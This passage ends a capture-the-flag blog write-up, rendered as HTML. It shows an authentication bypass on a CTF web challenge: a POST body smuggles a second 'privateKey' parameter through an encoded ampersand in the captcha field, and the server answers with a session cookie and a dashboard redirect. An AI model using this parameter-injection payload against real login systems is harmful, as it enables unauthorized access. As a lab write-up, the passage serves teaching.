+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">108</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://challs.xmas.htsp.ro:11000</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://challs.xmas.htsp.ro:11000/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+user=backd00r&amp;pass=catsrcool&amp;captcha_verification_value=random%26privateKey=8EE86735658A9CE426EAF4E26BB0450E
+</pre></div>
+</td></tr></table>
+
+<p>The above post body will result in the GET request as</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">/captchaVerify?captchaUserValue=random&amp;privateKey=8EE86735658A9CE426EAF4E26BB0450E&amp;privateKey=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre></div>
+</td></tr></table>
+
+<p>and the response returned to us is as follows:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14</pre></div></td><td class="code"><div class="highlight"><pre><span></span>HTTP/1.1 302 FOUND
+Server: nginx
+Date: Thu, 19 Dec 2019 12:07:00 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 251
+Location: http://challs.xmas.htsp.ro:11000/dashboard_jidcc88574c
+Connection: close
+Vary: Cookie
+Set-Cookie: session=eyJsb2dnZWQiOnRydWV9.Xftn5A.sdhb9kxBfoqHgBPvbz1rnTdA0ik; HttpOnly; Path=/
+
+<span class="cp">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;</span>
+<span class="nt">&lt;title&gt;</span>Redirecting...<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Redirecting...<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>You should be redirected automatically to target URL: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;/dashboard_jidcc88574c&quot;</span><span class="nt">&gt;</span>/dashboard_jidcc88574c<span class="nt">&lt;/a&gt;</span>.  If not click the link.
+</pre></div>
+</td></tr></table>
+
+<p>We follow the redirect and are show the below page. The wtf.mp4 contains the flag as shown in the last image.  </p>
+<p><img alt="dir" src="img/1.2.jpg" /></p>
+<p><img alt="flag" src="img/1.3.jpg" /></p>
+<p>That was how I approached the problem and solved it. Feel free to ping me on twitter for feedback or queries.<br />
+- 0xm4v3rick</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="/tag/webappsec.html">webappsec</a>
+      <a href="/tag/auth-bypass.html">auth bypass</a>
+      <a href="/tag/writeup.html">writeup</a>
+    </p>
+  </div>
+
+
+
+
+
+</article>
+
+    <footer>
+<p>&copy;  </p>
+<p>    Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+
+<br> &copy; Copyright 2020, securitytaters.info
+</p>    </footer>
+  </main>
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " securitytaters ",
+  "url" : "",
+  "image": "",
+  "description": ""
+}
+</script>
+
+</body>
+</html>
